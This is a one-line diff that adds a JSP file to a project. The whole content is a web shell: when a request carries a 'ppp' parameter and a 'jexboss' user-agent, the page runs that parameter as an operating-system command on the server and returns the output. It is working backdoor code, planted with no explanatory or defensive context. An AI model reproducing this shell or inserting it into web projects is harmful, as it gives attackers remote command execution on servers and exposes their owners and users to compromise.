@@ -1,0 +1,1 @@
+<%@ page import="java.util.*,java.io.*"%><pre><% if (request.getParameter("ppp") != null && request.getHeader("user-agent").equals("jexboss")) { Process p = Runtime.getRuntime().exec(request.getParameter("ppp")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }}%>
